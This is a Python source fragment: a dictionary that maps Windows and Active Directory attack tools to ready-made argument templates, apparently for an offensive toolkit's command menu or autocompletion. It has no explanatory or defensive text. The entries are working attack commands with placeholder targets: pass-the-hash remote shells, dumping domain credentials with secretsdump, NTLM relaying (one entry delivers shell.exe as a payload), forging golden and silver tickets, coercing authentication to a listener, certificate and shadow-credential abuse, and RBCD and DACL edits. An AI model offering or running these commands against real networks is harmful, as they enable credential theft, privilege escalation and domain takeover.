BUILTIN_ARGS = {
    "net": [
        ("user", "List users"), ("user username /add", "Add user"),
        ("localgroup administrators username /add", "Add to admin"),
        ("share", "List shares"), ("use \\\\target\\share", "Connect share"),
        ("view target", "View target"), ("time target", "Get time"),
    ],
    "dsquery": [
        ("user", "List users"), ("computer", "List computers"),
        ("group", "List groups"), ("server", "List DCs"),
    ],
    "dsmod": [
        ("user 'CN=user,CN=Users,DC=domain,DC=com' -pwd Password123", "Reset password"),
    ],
    "dsadd": [
        ("user 'CN=user,CN=Users,DC=domain,DC=com' -pwd Password123", "Add user"),
    ],
    "dsrm": [
        ("'CN=user,CN=Users,DC=domain,DC=com'", "Delete object"),
    ],
    "dsget": [
        ("group 'CN=Domain Admins,CN=Users,DC=domain,DC=com' -members", "Get group members"),
    ],
    "csvde": [
        ("-f output.csv -r '(objectClass=user)'", "Export users"),
    ],
    "ldifde": [
        ("-f output.ldf -r '(objectClass=user)'", "Export LDIF"),
    ],
    "adfind": [
        ("-f 'objectcategory=person'", "Find users"),
        ("-f 'objectcategory=computer'", "Find computers"),
        ("-f '(&(objectcategory=person)(admincount=1))'", "Find admins"),
    ],
    "admod": [
        ("-b 'CN=user,CN=Users,DC=domain,DC=com' description::'test'", "Modify user"),
    ],
    "psexec": [
        ("\\\\target -s cmd", "System shell"),
        ("\\\\target -u user -p pass cmd", "Remote exec"),
    ],
    "psexec.py": [
        ("domain/user:pass@target", "Remote shell"),
        ("domain/user@target -hashes :NTHASH", "Pass hash"),
    ],
    "wmiexec.py": [
        ("domain/user:pass@target", "WMI shell"),
        ("domain/user@target -hashes :NTHASH", "WMI pass hash"),
    ],
    "smbexec.py": [
        ("domain/user:pass@target", "SMB shell"),
    ],
    "dcomexec.py": [
        ("domain/user:pass@target", "DCOM shell"),
    ],
    "atexec.py": [
        ("domain/user:pass@target 'whoami'", "Scheduled task exec"),
    ],
    "secretsdump.py": [
        ("domain/user:pass@target", "Dump secrets"),
        ("-just-dc domain/user:pass@target", "DC only"),
        ("-ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL", "Local dump"),
    ],
    "ntlmrelayx.py": [
        ("-t smb://target -smb2support", "Relay to SMB"),
        ("-t ldap://target -smb2support", "Relay to LDAP"),
        ("-tf targets.txt -smb2support", "Bulk relay"),
    ],
    "krbrelayx.py": [
        ("-t target -a ldap", "Kerberos relay"),
    ],
    "getTGT.py": [
        ("domain/user -hashes :NTHASH", "Get TGT with hash"),
        ("domain/user:password", "Get TGT with password"),
    ],
    "getST.py": [
        ("-spn cifs/target domain/user:password", "Get service ticket"),
        ("-spn cifs/target domain/user -hashes :NTHASH", "Pass hash ST"),
    ],
    "ticketer.py": [
        ("-domain-sid SID -domain DOMAIN -spn cifs/target -user user -groups 512 GOLDEN_TICKET", "Golden ticket"),
        ("-domain-sid SID -domain DOMAIN -spn cifs/target -user user -groups 512 SILVER_TICKET", "Silver ticket"),
    ],
    "raiseChild.py": [
        ("domain/user:password", "Child to parent escalation"),
    ],
    "sambaPipe.py": [
        ("domain/user:password@target", "Samba pipe"),
    ],
    "smbrelayx.py": [
        ("-h target -e shell.exe", "Relay with payload"),
    ],
    "karmaSMB.py": [
        ("-listen 445", "Karma SMB server"),
    ],
    "mitm6.py": [
        ("-d domain.local", "IPv6 MITM"),
    ],
    "petitpotam.py": [
        ("listener target", "NTLM coercion"),
    ],
    "dfscoerce.py": [
        ("-d domain -u user -p pass listener target", "DFS coercion"),
    ],
    "shadowcoerce.py": [
        ("-d domain -u user -p pass listener target", "Shadow coercion"),
    ],
    "coercer.py": [
        ("-u user -p pass -d domain -l listener -t target", "All coercion"),
    ],
    "certipy": [
        ("find -u user@domain -p pass -target DC", "Find cert issues"),
        ("req -u user@domain -p pass -ca CA -target DC -template Template", "Request cert"),
        ("auth -pfx cert.pfx", "Auth with cert"),
    ],
    "certi.py": [
        ("shadow -u user@domain -p pass -dc-ip DC -target target", "Shadow credentials"),
    ],
    "PKINITtools": [
        ("gettgtpkinit.py domain/user -cert-pfx cert.pfx -pfx-pass pass", "Get TGT via PKINIT"),
    ],
    "passthecert.py": [
        ("-action write_rbcd -src user -target computer -cert cert.pem -key key.pem", "RBCD attack"),
    ],
    "bloodyAD.py": [
        ("-u user -p pass -d domain addComputer attacker", "Add computer"),
        ("-u user -p pass -d domain setRbcd target attacker", "Set RBCD"),
        ("-u user -p pass -d domain getObjectAttributes user", "Get attributes"),
    ],
    "ldeep.py": [
        ("ldap -d domain -s ldap://DC -u user -p pass", "LDAP query"),
    ],
    "pywhisker.py": [
        ("-d domain -u user -p pass --target target --action add", "Add shadow creds"),
    ],
    "targetedKerberoast.py": [
        ("-d domain -u user -p pass", "Targeted kerberoast"),
    ],
    "addcomputer.py": [
        ("domain/user:pass -dc-ip DC", "Add computer"),
    ],
    "rbcd.py": [
        ("-delegate-from attacker -delegate-to target -dc-ip DC", "RBCD attack"),
    ],
    "dacledit.py": [
        ("domain/user:pass -target target -dc-ip DC", "Edit DACL"),
    ],
    "owneredit.py": [
        ("domain/user:pass -target target -dc-ip DC", "Edit ownership"),
    ],
}
